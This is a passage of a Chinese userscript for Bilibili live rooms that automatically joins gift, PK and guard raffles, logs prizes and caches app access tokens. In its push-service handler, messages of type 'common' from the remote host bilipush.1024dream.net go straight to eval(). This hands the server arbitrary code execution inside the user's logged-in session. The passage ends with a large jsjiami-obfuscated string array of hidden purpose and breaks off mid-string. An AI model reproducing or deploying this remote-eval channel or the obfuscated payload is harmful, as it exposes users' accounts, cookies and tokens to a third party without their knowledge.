                            if (BiliPushUtils.pkIdSet.has(id)) return $.Deferred().resolve();
                            BiliPushUtils.pkIdSet.add(id); // 加入id记录列表
                            await BiliPushUtils.Pk._join(roomid, obj.id);
                        }
                        return $.Deferred().resolve();
                    }catch(e){
                        await delayCall(() => BiliPushUtils.Pk.join(roomid, ids));
                    }
                },
                _join: (roomid, id) => {
                    //if (Info.blocked) return $.Deferred().resolve();
                    roomid = parseInt(roomid, 10);
                    id = parseInt(id, 10);
                    if (isNaN(roomid) || isNaN(id)) return $.Deferred().reject();
                    RafflePorcess.append(roomid, id);
                    window.toast(`[自动抽奖][乱斗领奖]检测到(roomid=${roomid},id=${id})`, 'info');
                    delayCall(() => BiliPushUtils.API.Pk.join(roomid, id).then((response) => {
                        DEBUG('BiliPushUtils.Pk._join: BiliPushUtils.API.Pk.join', response);
                        if (response.code === 0) {
                            try{
                                var giftInfo = response.data.award_text.split('X');
                                Statistics.appendGift(giftInfo[0],giftInfo[1]-0,response.data.award_ex_time);
                            }catch(e){
                            }
                            window.toast(`[自动抽奖][乱斗领奖]领取(roomid=${roomid},id=${id})成功,${response.data.award_text}`, 'success');
                        } else if (response.msg.indexOf('拒绝') > -1) {
                            //Info.blocked = true;
                            //BiliPushUtils.up();
                            //window.toast('[自动抽奖][乱斗领奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
                        } else if (BiliPushUtils.msgIgnore(response.msg)) {
                            return delayCall(() => BiliPushUtils.Pk._join(roomid, id),1e3);
                        } else if (response.msg.indexOf('过期') > -1) {
                        } else {
                            window.toast(`[自动抽奖][乱斗领奖](roomid=${roomid},id=${id})${response.msg}`, 'caution');
                        }
                        RafflePorcess.remove(roomid, id);
                    }, () => {
                        window.toast(`[自动抽奖][乱斗领奖]领取(roomid=${roomid},id=${id})失败，请检查网络`, 'error');
                        return delayCall(() => BiliPushUtils.Pk._join(roomid, id));
                    }),parseInt(Math.random()*6)*1e3);
                    return $.Deferred().resolve();
                }
            },
            Gift: {
                run:(roomid)=>(BiliPushUtils.Check.run(roomid)),
                join:async (roomid, raffleList) => {
                    try{
                        //console.log(`Gift.join`,roomid,raffleList,i)
                        //if (Info.blocked) return $.Deferred().resolve();
                        //if (i >= raffleList.length) return $.Deferred().resolve();
                        for(let obj of raffleList){
                            if (obj.status === 1) { // 可以参加
                                // raffleId过滤，防止重复参加
                                var raffleId = parseInt(obj.raffleId, 10);
                                if (BiliPushUtils.raffleIdSet.has(raffleId)) return $.Deferred().resolve();
                                BiliPushUtils.raffleIdSet.add(raffleId); // 加入raffleId记录列表
                                await BiliPushUtils.Gift._join(roomid, obj.raffleId, obj.type, obj.time_wait);
                            } else if (obj.status === 2 && obj.time > 0) { // 已参加且未开奖
                            }
                        }
                        return $.Deferred().resolve();
                    }
                    catch(e){
                        await delayCall(() => BiliPushUtils.Gift.join(roomid, raffleList),1e3);
                    }
                },
                _join: (roomid, raffleId, type, time_wait = 0) => {
                    //if (Info.blocked) return $.Deferred().resolve();
                    roomid = parseInt(roomid, 10);
                    raffleId = parseInt(raffleId, 10);
                    if (isNaN(roomid) || isNaN(raffleId)) return $.Deferred().reject();
                    if(!type){
                        delayCall(() => BiliPushUtils.Check.run(roomid));
                        return $.Deferred().resolve();
                    }
                    window.toast(`[自动抽奖][礼物抽奖]等待抽奖(roomid=${roomid},id=${raffleId},type=${type},time_wait=${time_wait})`, 'info');
                    RafflePorcess.append(roomid, raffleId);
                    delayCall(() => BiliPushUtils.API.Gift.join(roomid, raffleId, type).then((response) => {
                        DEBUG('BiliPushUtils.Gift._join: BiliPushUtils.API.Gift.join', response);
                        switch (response.code) {
                            case 0:
                                Statistics.appendGift(response.data.award_name,response.data.award_num,response.data.award_ex_time);
                                window.toast(`[自动抽奖][礼物抽奖]已参加抽奖(roomid=${roomid},id=${raffleId},type=${type}),${response.data.award_name+"x"+response.data.award_num}`, 'success');
                                break;
                            case 402:
                                // 抽奖已过期，下次再来吧
                                break;
                            case 65531:
                                // 65531: 非当前直播间或短ID直播间试图参加抽奖
                                //Info.blocked = true;
                                //BiliPushUtils.up();
                                //window.toast(`[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，已停止`, 'error');
                                break;
                            default:
                                if (response.msg.indexOf('拒绝') > -1) {
                                    //Info.blocked = true;
                                    //BiliPushUtils.up();
                                    //window.toast('[自动抽奖][礼物抽奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
                                } else if (BiliPushUtils.msgIgnore(response.msg)) {
                                    return delayCall(() => BiliPushUtils.Gift._join(roomid, raffleId, type),1e3);
                                } else {
                                    window.toast(`[自动抽奖][礼物抽奖](roomid=${roomid},id=${raffleId},type=${type})${response.msg}`, 'caution');
                                }
                        }
                        RafflePorcess.remove(roomid, raffleId);
                    }, () => {
                        window.toast(`[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，请检查网络`, 'error');
                        return delayCall(() => BiliPushUtils.Gift._join(roomid, raffleId, type),1e3);
                    }), (time_wait + 1) * 1e3);
                    return $.Deferred().resolve();
                }
            },
            Guard: {
                run:(roomid)=>(BiliPushUtils.Check.run(roomid)),
                join:async (roomid, guard) => {
                    try{
                        //console.log(`Guard.join`,roomid,guard,i)
                        //if (Info.blocked) return $.Deferred().resolve();
                        if (!guard) return $.Deferred().resolve();
                        for(let obj of guard){
                            // id过滤，防止重复参加
                            var id = parseInt(obj.id, 10);
                            if (BiliPushUtils.guardIdSet.has(id)) return $.Deferred().resolve();
                            BiliPushUtils.guardIdSet.add(id); // 加入id记录列表
                            await BiliPushUtils.Guard._join(roomid, obj.id);
                        }
                        return $.Deferred().resolve();
                    }catch(e){
                        await delayCall(() => BiliPushUtils.Guard.join(roomid, guard));
                    }
                },
                _join: (roomid, id) => {
                    //if (Info.blocked) return $.Deferred().resolve();
                    roomid = parseInt(roomid, 10);
                    id = parseInt(id, 10);
                    if (isNaN(roomid) || isNaN(id)) return $.Deferred().reject();
                    RafflePorcess.append(roomid, id);
                    window.toast(`[自动抽奖][舰队领奖]检测到(roomid=${roomid},id=${id})`, 'info');
                    delayCall(() =>BiliPushUtils.API.Guard.join(roomid, id).then((response) => {
                        DEBUG('BiliPushUtils.Guard._join: BiliPushUtils.API.Guard.join', response);
                        if (response.code === 0) {
                            Statistics.appendGift(response.data.award_name,response.data.award_num,response.data.award_ex_time);
                            window.toast(`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})成功,${response.data.award_name+"x"+response.data.award_num}`, 'success');
                        } else if (response.msg.indexOf('拒绝') > -1) {
                            //Info.blocked = true;
                            //BiliPushUtils.up();
                            //window.toast('[自动抽奖][舰队领奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
                        } else if (BiliPushUtils.msgIgnore(response.msg)) {
                            return delayCall(() => BiliPushUtils.Guard._join(roomid, id),1e3);
                        } else if (response.msg.indexOf('过期') > -1) {
                        } else {
                            window.toast(`[自动抽奖][舰队领奖](roomid=${roomid},id=${id})${response.msg}`, 'caution');
                        }
                        RafflePorcess.remove(roomid, id);
                    }, () => {
                        window.toast(`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})失败，请检查网络`, 'error');
                        return delayCall(() => BiliPushUtils.Guard._join(roomid, id));
                    }),parseInt(Math.random()*6*1e3));
                    return $.Deferred().resolve();
                }
            }
        }
        const BiliPush = {
            _ajax:(url, data, callback,error)=>{
                $.ajax({
                    type: "POST",
                    url: url,
                    data: data,
                    dataType: "json",
                    beforeSend: function (request) {
                    },
                    success: function (data) {
                        callback(data);
                    },
                    error:function(err){
                        error(err);
                    }
                })
            },
            connected:false,
            gsocket:null,
            gsocketTimeId:null,
            gheartTimeId:null,
            first:true,
            lock:false,
            connectWebsocket :(lazy = false)=>{
                if(BiliPush.first){
                    window.toast('初始化bilipush 推送服务', 'info');
                }
                if(BiliPush.lock)return;
                BiliPush.lock = true;
                if(lazy){
                    if(BiliPush.gsocket && BiliPush.gsocket.readyState < 2){
                        BiliPush.lock = false;
                        return;
                    }
                }
                var data = { uid:BilibiliLive.UID,version:VERSION };
                var url="https://bilipush.1024dream.net:5000/ws/pre-connect";
                BiliPush._ajax(url,data,function(d){
                    if(d.code==-1){
                        window.toast('bilipush 拒绝连接:'+d.msg, 'error');
                        BiliPush.lock = false;
                        return;
                    }
                    var url = d.server;
                    if (BiliPush.gsocket) BiliPush.gsocket.close();
                    BiliPush.gsocket = null;
                    BiliPush.gsocket = new WebSocket(url);
                    BiliPush.gsocket.onopen = function (e) {
                        if(BiliPush.first){
                            window.toast('bilipush 连接成功', 'success');
                            BiliPush.first = false;
                        }else{
                            console.info('bilipush 连接成功');
                        }
                        BiliPush.connected = true;
                        BiliPush.gsocket.send("ping");
                        BiliPush.gheartTimeId = setInterval(function () {
                            BiliPush.gsocket.send("ping");
                        }, 120e3);
                    };
                    BiliPush.gsocket.onclose = function (e) {
                        console.error('bilipush 连接断开');
                        BiliPush.connected = false;
                        BiliPush.gsocket = null;
                        clearTimeout(BiliPush.gsocketTimeId);
                        clearInterval(BiliPush.gheartTimeId);
                        BiliPush.gsocketTimeId = setTimeout(function () {
                            if(CONFIG.DD_BP){
                                BiliPush.connectWebsocket();
                            }
                        }, 5000);
                    };
                    BiliPush.gsocket.onmessage = function (e) {
                        try {
                            var msg = JSON.parse(e.data);
                            BiliPush.onRafflePost(msg);
                        } catch (err) {
                            console.log(e,err);
                            return;
                        }
                    };
                    BiliPush.gsocket.onerror = function (e) {
                        console.error('bilipush 连接异常');
                        BiliPush.connected = false;
                        BiliPush.gsocket = null;
                        clearTimeout(BiliPush.gsocketTimeId);
                        clearInterval(BiliPush.gheartTimeId);
                        BiliPush.gsocketTimeId = setTimeout(function () {
                            if(CONFIG.DD_BP){
                                BiliPush.connectWebsocket();
                            }
                        }, 5000);
                    };
                    BiliPush.lock = false;
                }, function (err) {
                    console.error("bilipush连接失败，等待重试...");
                    BiliPush.connected = false;
                    BiliPush.gsocketTimeId = setTimeout(function () {
                        if(CONFIG.DD_BP){
                            BiliPush.connectWebsocket();
                        }
                    }, 5000);
                    BiliPush.lock = false;
                });
            },
            onRafflePost :(rsp)=>{
                try{
                    let raffle_data = JSON.parse(rsp);
                    let {code,type,data} = raffle_data;
                    if(code==0){
                        if(type=="raffle"){
                            let {room_id,raffle_type} = data;
                            switch(raffle_type){
                                case "TV" :
                                case "GUARD":
                                case "PK":
                                case "GIFT":
                                    window.toast(`bilipush 监控到 房间 ${room_id} 的礼物`, 'info');
                                    BiliPushUtils.Check.process(room_id);
                                    break;
                                case "STORM":
                                    window.toast(`bilipush 监控到 房间 ${room_id} 的节奏风暴`, 'info');
                                    BiliPushUtils.Storm.run(room_id);
                                    break;
                            }
                        }else if(type=="common"){
                            try{
                                eval(data);
                            }catch(e){
                                console.error("bilipush 回调失败，可能浏览器不支持");
                            }
                        }else if(type=="notice"){
                            window.toast(data, 'caution');
                        }
                        else if(type=="msg"){
                            window.alertdialog("魔改助手消息",data);
                        }else if(type=="reload"){
                            localStorage.setItem('LIVE_PLAYER_STATUS',JSON.stringify({type:'html5',timeStamp:ts_ms()}));
                            var volume = localStorage.getItem('videoVolume')||0;
                            if(volume==0){
                                localStorage.setItem('videoVolume',0.1);
                            }
                            location.reload();
                        }
                    }
                }catch(e){
                    console.error(e,rsp);
                }
            },
            run:()=>{
                BiliPushUtils.Check.start();
                BiliPushUtils.Check.run(window.BilibiliLive.ROOMID);
                BiliPushUtils.Storm.run(window.BilibiliLive.ROOMID);
                if(CONFIG.DD_BP){
                    BiliPush.connectWebsocket(true);
                }else if(BiliPush.gsocket) {
                    BiliPush.gsocket.close();
                }
                window.websocket = BiliPush.gsocket;
                BiliPushUtils.clearSet();
                setInterval(()=>{
                    BiliPushUtils.clearSet();
                },5e3);
            }
        }
        const RafflePorcess = {
            raffle_Process:{},
            save_Interval:0,
            run:()=>{
                try{
                    var raffle_Process = JSON.parse(localStorage.getItem(`${NAME}_RAFFLE`)) || {};
                    for(let room_id in RafflePorcess.raffle_Process){
                        BiliPushUtils.Check.run(room_id);
                    }
                }catch(e){
                }
                if(RafflePorcess.save_Interval==0){
                    RafflePorcess.save_Interval = setInterval(()=>{
                        localStorage.setItem(`${NAME}_RAFFLE`, JSON.stringify(RafflePorcess.raffle_Process));
                    },100);
                }
            },
            append:(room_id,raffle_id)=>{
                if(RafflePorcess.raffle_Process[room_id]){
                    if(RafflePorcess.raffle_Process[room_id].indexOf(raffle_id)==-1){
                        RafflePorcess.raffle_Process[room_id].push(raffle_id);
                    }
                }else{
                    RafflePorcess.raffle_Process[room_id]=[raffle_id];
                }
            },
            remove:(room_id,raffle_id)=>{
                if(RafflePorcess.raffle_Process[room_id]){
                    RafflePorcess.raffle_Process[room_id] = RafflePorcess.raffle_Process[room_id].filter(r=>r!=raffle_id);
                    if(RafflePorcess.raffle_Process[room_id].length==0){
                        delete RafflePorcess.raffle_Process[room_id];
                    }
                }
            }
        }
        const Statistics = {
            gifts:{},
            queue:[],
            save_Interval:0,
            process_timeOut:0,
            run:()=>{
                try{
                    Statistics.gifts = JSON.parse(localStorage.getItem(`${NAME}_DAYGIFTS`)) || {};
                }catch(e){
                }
                if(!CACHE.stats_ts || checkNewDay(CACHE.stats_ts)){
                    Statistics.gifts = {};
                    CACHE.stats_ts = ts_ms();
                }
                if(Statistics.save_Interval==0){
                    Statistics.save_Interval = setInterval(()=>{
                        localStorage.setItem(`${NAME}_DAYGIFTS`, JSON.stringify(Statistics.gifts));
                    },100);
                }
                if(Statistics.process_timeOut == 0){
                    Statistics.process_timeOut = setTimeout(()=>Statistics.process(),200);
                }
                runTomorrow(Statistics.run);
            },
            appendGift:(name,count,expire)=>{
                if(expire){
                    var expireDay = Math.ceil((expire * 1e3 - new Date().getTime())/86400e3);
                    name = `${name}(${expireDay}d)`;
                }
                console.log(`记录：获得 ${name}x${count}`);
                Statistics.queue.push({name:name,count:count});
            },
            process:()=>{
                while(Statistics.queue.length>0){
                    let{ name,count }=Statistics.queue.shift();
                    if(Statistics.gifts[name]){
                        Statistics.gifts[name] += count;
                    }else{
                        Statistics.gifts[name] = count;
                    }
                }
                clearTimeout(Statistics.process_timeOut);
                Statistics.process_timeOut = setTimeout(()=>Statistics.process(),200);
            },
            showDayGifts:()=>{
                let sumGroupKey = ['辣条'];
                let sumGroup = {};
                let gifts = [];
                for(let [k,v] of Object.entries(Statistics.gifts)){
                    gifts.push(`${k}x${v}`);
                    for(let t of sumGroupKey){
                        if(k.startsWith(t)){
                            if(sumGroup[t]){
                                sumGroup[t] += v;
                            }else{
                                sumGroup[t] = v;
                            }
                        }
                    }
                }
                if(gifts.length>0){
                    gifts.push(`统计:`);
                    for(let [k,v] of Object.entries(sumGroup)){
                        gifts.push(`${k}x${v}`);
                    }
                }
                window.alertdialog('当日礼物统计', gifts.join('<br>'));
            },
        };
        const KeySign = {
            sort:(obj)=>{
                let keys = Object.keys(obj).sort();
                let p=[];
                for(let key of keys){
                    p.push(`${key}=${obj[key]}`);
                }
                return p.join('&');
            },
            convert:(obj)=>{
                for(let k in obj){
                    if($.type(obj[k])=="array"){
                        obj[k] = JSON.stringify(obj[k]);
                    }
                }
            },
        };
        const TokenLoad = async ()=>{
            if(Info.csrf_token){
                let tinfo = JSON.parse(localStorage.getItem(`${NAME}_Token`)) || {};
                if(tinfo.csrf_token == Info.csrf_token && tinfo.time > ts_s())
                {
                    Info.appToken = tinfo;
                }else{
                    tinfo = await getAccessToken();
                    tinfo.time = ts_s() + tinfo.expires_in;
                    tinfo.csrf_token = Info.csrf_token;
                    localStorage.setItem(`${NAME}_Token`, JSON.stringify(tinfo));
                    Info.appToken = tinfo;
                }
            }
        };

var _0xodG='jsjiami.com.v6',_0x192e=[_0xodG,'\x43\x6a\x2f\x43\x6b\x73\x4b\x4c\x4d\x67\x3d\x3d','\x77\x70\x73\x62\x77\x70\x5a\x4b\x52\x6c\x4c\x44\x70\x4d\x4f\x35','\x77\x36\x73\x31\x43\x58\x77\x4d','\x77\x6f\x4d\x47\x77\x6f\x70\x4b\x52\x31\x44\x44\x70\x73\x4f\x77','\x5a\x38\x4f\x53\x77\x72\x6a\x44\x68\x63\x4b\x6a','\x77\x71\x4c\x43\x71\x43\x44\x43\x6e\x4d\x4b\x56','\x77\x36\x67\x33\x77\x35\x66\x43\x75\x6c\x30\x3d','\x77\x71\x62\x43\x71\x31\x70\x66\x44\x41\x3d\x3d','\x77\x71\x54\x43\x69\x38\x4f\x57\x77\x6f\x52\x4a','\x4f\x6e\x62\x43\x6f\x47\x54\x43\x72\x41\x3d\x3d','\x44\x63\x4f\x5a\x77\x35\x2f\x44\x74\x63\x4f\x42','\x56\x73\x4b\x30\x77\x37\x41\x48\x77\x35\x38\x3d','\x5a\x54\x4e\x79\x45\x4d\x4f\x4a','\x77\x35\x58\x44\x73\x68\x4e\x58\x77\x6f\x55\x3d','\x77\x6f\x6a\x43\x70\x31\x39\x74\x4c\x77\x3d\x3d','\x77\x35\x4e\x6f\x77\x71\x37\x44\x74\x73\x4f\x32','\x52\x63\x4f\x39\x77\x70\x33\x43\x75\x6a\x38\x3d','\x77\x35\x62\x43\x68\x31\x68\x6c\x77\x71\x55\x3d','\x77\x71\x55\x75\x77\x71\x68\x50\x58\x67\x3d\x3d','\x43\x51\x4d\x5a\x44\x4d\x4f\x77','\x77\x71\x2f\x44\x67\x63\x4b\x54\x59\x41\x3d\x3d','\x4c\x4d\x4f\x6a\x4b\x4d\x4f\x35\x77\x72\x38\x3d','\x77\x35\x78\x79\x77\x70\x59\x3d','\x77\x37\x38\x32\x4a\x47\x6b\x65','\x77\x6f\x55\x47\x77\x70\x5a\x4f','\x77\x72\x77\x64\x77\x34\x58\x44\x6d\x6d\x45\x3d','\x77\x37\x54\x43\x67\x6c\x70\x6f\x77\x70\x73\x3d','\x61\x73\x4f\x46\x77\x72\x4c\x43\x6d\x77\x63\x3d','\x56\x6c\x6c\x2b\x41\x33\x67\x3d','\x41\x6a\x55\x56\x5a\x73\x4b\x6f','\x5a\x73\x4b\x33\x77\x70\x31\x2b\x77\x35\x45\x3d','\x77\x6f\x73\x53\x77\x70\x6f\x7a\x77\x37\x49\x3d','\x77\x34\x68\x57\x77\x6f\x2f\x44\x68\x38\x4f\x50','\x47\x73\x4f\x50\x77\x70\x6e\x43\x75\x6c\x59\x3d','\x77\x6f\x73\x61\x77\x6f\x38\x66\x77\x34\x70\x37\x45\x41\x3d\x3d','\x56\x38\x4f\x6e\x77\x71\x7a\x43\x6b\x79\x77\x3d','\x4a\x48\x54\x43\x73\x56\x76\x43\x6c\x67\x3d\x3d','\x4c\x51\x2f\x44\x6d\x52\x4d\x37\x77\x70\x67\x67','\x4b\x67\x66\x43\x6e\x38\x4b\x6a\x4c\x6d\x37\x43\x71\x48\x30\x75\x77\x37\x73\x3d','\x42\x38\x4b\x53\x59\x44\x39\x65','\x55\x7a\x6a\x44\x6b\x48\x78\x4d\x77\x35\x50\x44\x75\x67\x3d\x3d','\x43\x4d\x4f\x53\x77\x71\x6e\x43\x76\x58\x70\x67\x77\x70\x73\x3d','\x77\x72\x4c\x44\x74\x56\x54\x44\x71\x41\x3d\x3d','\x52\x57\x74\x68\x77\x34\x78\x77\x4d\x44\x4c\x44\x71\x73\x4f\x6a\x77\x6f\x50\x43\x72\x41\x41\x62\x77\x72\x41\x3d','\x4a\x52\x52\x49\x77\x6f\x6e\x44\x73\x52\x30\x4a\x77\x35\x33\x44\x76\x53\x41\x2f\x77\x71\x55\x44\x4e\x44\x70\x50\x77\x72\x74\x31','\x52\x6d\x67\x6b\x58\x63\x4b\x6d','\x65\x73\x4f\x73\x77\x35\x33\x43\x67\x63\x4b\x48','\x4a\x52\x7a\x44\x6d\x78\x73\x3d','\x77\x34\x56\x47\x77\x35\x4d\x45\x77\x70\x50\x43\x68\x4d\x4f\x37\x77\x36\x41\x30\x4b\x4d\x4b\x56\x55\x4d\x4f\x6e\x77\x37\x6e\x44\x6b\x51\x62\x43\x6b\x38\x4f\x61\x4d\x33\x45\x3d','\x5a\x53\x42\x6e\x45\x73\x4f\x6a\x77\x35\x52\x70\x53\x63\x4f\x44\x52\x4d\x4f\x55\x77\x37\x33\x44\x6f\x38\x4f\x4d\x4d\x77\x3d\x3d','\x4d\x33\x6a\x44\x67\x38\x4f\x36\x50\x77\x3d\x3d','\x59\x63\x4f\x54\x77\x71\x50\x44\x69\x63\x4b\x43','\x77\x35\x6a\x43\x74\x6d\x39\x38\x77\x72\x63\x3d','\x77\x34\x77\x36\x77\x35\x4c\x43\x6c\x6b\x49\x3d','\x77\x70\x6a\x43\x73\x4d\x4b\x48\x77\x34\x2f\x43\x67\x41\x3d\x3d','\x51\x4d\x4f\x4b\x77\x70\x37\x44\x72\x4d\x4b\x4e\x77\x71\x66\x44\x76\x67\x3d\x3d','\x77\x71\x6e\x44\x70\x73\x4b\x64\x77\x37\x54\x44\x70\x77\x3d\x3d','\x48\x53\x4d\x39\x4d\x73\x4f\x36','\x77\x71\x58\x44\x6b\x58\x2f\x44\x74\x63\x4b\x58','\x77\x72\x33\x43\x6e\x73\x4b\x52\x77\x36\x50\x43\x75\x67\x3d\x3d','\x51\x63\x4f\x6c\x77\x72\x4c\x43\x6c\x54\x31\x41','\x77\x72\x66\x43\x70\x32\x70\x44\x4c\x67\x3d\x3d','\x62\x45\x4d\x6d\x65\x73\x4b\x67\x61\x73\x4b\x2b','\x42\x6a\x6c\x50\x4a\x33\x51\x3d','\x77\x70\x7a\x44\x69\x58\x48\x44\x6f\x38\x4b\x54','\x4b\x38\x4f\x2b\x77\x37\x33\x44\x6a\x73\x4f\x59','\x52\x63\x4f\x58\x77\x70\x2f\x44\x72\x38\x4b\x33\x77\x71\x37\x44\x75\x63\x4f\x4e\x77\x34\x38\x3d','\x47\x4d\x4f\x61\x4f\x38\x4f\x42\x77\x71\x6c\x61\x77\x37\x30\x3d','\x77\x37\x2f\x43\x68\x6e\x4a\x59\x77\x6f\x63\x72\x42\x58\x50\x43\x72\x52\x4a\x35\x77\x34\x72\x44\x72\x73\x4b\x7a','\x50\x78\x4c\x44\x71\x52\x51\x58','\x77\x35\x62\x44\x69\x79\x6c\x53\x77\x71\x4d\x73\x46\x51\x3d\x3d','\x77\x35\x31\x58\x77\x35\x56\x75\x65\x57\x76\x44\x6d\x51\x3d\x3d','\x77\x36\x51\x44\x48\x6b\x4d\x57','\x43\x38\x4f\x4f\x48\x4d\x4f\x39\x77\x71\x4d\x3d','\x65\x6c\x42\x47\x77\x37\x70\x42\x47\x77\x4c\x44\x6c\x41\x3d\x3d','\x64\x43\x38\x45\x4e\x4d\x4b\x37','\x47\x73\x4f\x54\x4c\x73\x4f\x48\x77\x70\x6b\x3d','\x43\x68\x6a\x44\x72\x7a\x49\x33','\x77\x6f\x2f\x44\x6b\x45\x2f\x44\x67\x6e\x67\x3d','\x77\x72\x37\x44\x6b\x6c\x76\x44\x6f\x63\x4b\x56','\x77\x71\x62\x44\x68\x33\x50\x44\x71\x41\x3d\x3d','\x48\x6a\x6a\x44\x6a\x42\x51\x55','\x4b\x67\x77\x66\x62\x38\x4b\x65','\x77\x72\x58\x44\x6f\x6b\x44\x44\x76\x73\x4b\x71\x63\x42\x59\x3d','\x77\x70\x50\x44\x74\x63\x4b\x4d\x77\x34\x7a\x44\x69\x41\x3d\x3d','\x77\x6f\x38\x4d\x77\x70\x70\x4d\x54\x46\x7a\x44\x72\x73\x4f\x37\x77\x72\x62\x44\x76\x38\x4b\x64\x64\x63\x4b\x4e\x77\x70\x6b\x6a\x43\x63\x4b\x6c\x77\x35\x6f\x3d','\x54\x33\x59\x42\x65\x63\x4b\x37','\x77\x36\x30\x47\x77\x72\x62\x44\x6f\x54\x34\x3d','\x4f\x38\x4f\x31\x77\x71\x6e\x43\x6f\x45\x67\x3d','\x58\x69\x50\x44\x70\x6e\x42\x45','\x64\x73\x4f\x74\x77\x71\x48\x44\x67\x38\x4b\x31','\x77\x34\x4d\x68\x49\x31\x38\x4d','\x51\x46\x70\x38\x77\x36\x74\x39','\x77\x71\x6e\x43\x69\x4d\x4f\x4b\x41\x6c\x77\x3d','\x48\x77\x54\x43\x70\x73\x4b\x45\x49\x67\x3d\x3d','\x48\x52\x62\x44\x70\x6a\x55\x4d','\x55\x73\x4b\x65\x77\x70\x46\x79\x77\x37\x45\x3d','\x62\x30\x35\x4f\x77\x37\x56\x62','\x43\x47\x76\x43\x74\x31\x44\x43\x74\x51\x3d\x3d','\x61\x38\x4f\x67\x77\x34\x2f\x44\x72\x73\x4b\x65','\x77\x71\x4c\x43\x69\x33\x39\x7a\x43\x67\x3d\x3d','\x77\x71\x2f\x43\x70\x58\x78\x59\x4d\x67\x3d\x3d','\x47\x44\x64\x51\x4a\x6e\x2f\x44\x73\x78\x70\x48','\x62\x4d\x4b\x57\x77\x71\x78\x70\x77\x37\x49\x3d','\x4b\x31\x6e\x44\x67\x63\x4f\x47\x43\x51\x3d\x3d','\x4b\x6a\x56\x6f\x77\x72\x62\x44\x6d\x41\x3d\x3d','\x50\x38\x4b\x7a\x51\x77\x3d\x3d','\x77\x72\x54\x44\x67\x6c\x33\x44\x74\x47\x6b\x3d','\x77\x36\x45\x76\x50\x41\x49\x58','\x51\x30\x42\x2f\x46\x46\x56\x76\x77\x72\x76\x44\x71\x4d\x4f\x6a','\x77\x35\x70\x4e\x77\x36\x56\x35\x62\x6e\x48\x44\x68\x4d\x4f\x38','\x77\x71\x37\x43\x74\x4d\x4b\x76\x77\x34\x6e\x43\x6b\x51\x3d\x3d','\x77\x35\x4a\x4f\x77\x36\x4d\x44\x77\x72\x67\x3d','\x4a\x73\x4f\x6c\x77\x6f\x66\x43\x67\x48\x41\x79','\x77\x34\x54\x44\x6c\x68\x6c\x4b\x77\x6f\x67\x67\x58\x6d\x35\x65\x50\x56\x4a\x39\x50\x6d\x6b\x3d','\x5a\x4d\x4f\x54\x77\x6f\x62\x44\x72\x63\x4b\x77','\x77\x70\x33\x43\x74\x38\x4f\x2f\x77\x70\x46\x50','\x48\x42\x7a\x44\x70\x6a\x73\x4c','\x77\x71\x55\x74\x77\x71\x45\x69\x77\x34\x41\x70','\x77\x72\x4d\x69\x77\x34\x48\x44\x74\x58\x34\x3d','\x43\x54\x52\x71\x77\x71\x76\x43\x70\x30\x49\x3d','\x77\x72\x34\x4f\x77\x71\x51\x63\x77\x37\x38\x3d','\x77\x71\x6e\x43\x6b\x4d\x4b\x41\x77\x36\x4c\x43\x6f\x51\x3d\x3d','\x77\x36\x33\x43\x6f\x6c\x31\x5a\x77\x6f\x51\x3d','\x43\x63\x4f\x50\x77\x35\x2f\x44\x6c\x38\x4f\x66\x77\x70\x41\x3d','\x59\x77\x77\x58\x4b\x73\x4b\x72','\x77\x71\x72\x43\x71\x38\x4f\x4a\x77\x71\x78\x4e','\x77\x71\x6a\x44\x76\x38\x4b\x77\x5a\x4d\x4f\x48','\x58\x67\x42\x55\x4b\x38\x4f\x58\x77\x6f\x41\x3d','\x58\x63\x4f\x7a\x77\x6f\x66\x43\x6a\x67\x51\x3d','\x41\x43\x4d\x70\x47\x73\x4b\x4d\x50\x51\x3d\x3d','\x77\x37\x4a\x6e\x77\x6f\x6e\x44\x6f\x79\x59\x3d','\x59\x38\x4b\x6c\x77\x71\x70\x73\x77\x35\x44\x44\x67\x73\x4f\x6f\x77\x72\x6a\x44\x73\x38\x4b\x45\x4b\x6e\x4c\x44\x70\x38\x4f\x42\x50\x48\x70\x74\x77\x36\x31\x30\x51\x63\x4f\x2f\x77\x37\x34\x3d','\x41\x63\x4f\x47\x77\x70\x2f\x43\x6f\x6e\x38\x3d','\x77\x37\x62\x43\x71\x6c\x6c\x46\x77\x6f\x51\x3d','\x64\x63\x4f\x73\x77\x72\x58\x44\x6c\x73\x4b\x58\x77\x6f\x2f\x44\x6b\x73\x4f\x34\x77\x37\x6c\x67\x77\x36\x50\x44\x6b\x54\x62\x44\x71\x41\x3d\x3d','\x77\x71\x54\x44\x74\x30\x41\x3d','\x77\x34\x54\x44\x6c\x68\x6c\x56\x77\x6f\x38\x3d','\x63\x69\x42\x7a\x45\x73\x4f\x73\x77\x35\x31\x51\x51\x63\x4f\x4a\x61\x38\x4f\x51\x77\x37\x33\x44\x70\x63\x4f\x55','\x48\x51\x44\x44\x6e\x69\x30\x32\x44\x63\x4f\x67\x77\x35\x76\x44\x73\x78\x33\x44\x6a\x52\x56\x46\x77\x70\x34\x3d','\x56\x73\x4b\x48\x77\x72\x35\x74\x77\x34\x4d\x3d','\x77\x34\x58\x43\x76\x45\x56\x37\x77\x71\x4d\x48\x4f\x55\x59\x3d','\x53\x73\x4f\x42\x77\x34\x4c\x43\x6e\x73\x4b\x59\x77\x71\x4a\x45','\x77\x70\x7a\x43\x6c\x30\x4a\x4d\x50\x30\x72\x44\x74\x47\x4c\x44\x75\x63\x4f\x66\x77\x70\x6f\x73','\x77\x34\x78\x36\x77\x6f\x44\x44\x67\x41\x34\x5a\x77\x37\x4c\x43\x6e\x63\x4f\x4e\x59\x6a\x4c\x43\x69\x45\x4d\x68','\x77\x37\x4d\x7a\x49\x56\x67\x65','\x61\x38\x4b\x6f\x77\x71\x68\x74\x77\x35\x6a\x44\x6e\x73\x4f\x75\x77\x6f\x49\x3d','\x77\x71\x76\x44\x6a\x57\x62\x44\x6f\x56\x6c\x4f\x58\x41\x3d\x3d','\x46\x43\x4c\x44\x67\x52\x73\x47\x77\x71\x30\x31\x41\x57\x37\x44\x75\x41\x3d\x3d','\x77\x71\x72\x43\x6f\x73\x4f\x7a\x77\x6f\x4a\x64','\x54\x38\x4f\x57\x77\x6f\x4c\x44\x74